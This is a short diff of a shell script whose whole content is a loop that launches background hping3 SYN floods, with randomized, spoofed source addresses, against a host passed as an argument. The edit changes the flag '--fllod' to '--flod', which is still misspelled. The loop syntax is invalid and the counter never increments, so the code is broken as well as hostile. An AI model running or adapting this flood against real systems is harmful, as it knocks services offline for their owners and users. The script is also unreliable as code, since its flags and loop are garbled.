@@ -4,5 +4,5 @@
 n = 0
 while n < $1 :
 do 
-	hping3 --rand-source --fllod -S $2 &
+	hping3 --rand-source --flod -S $2 &
 done
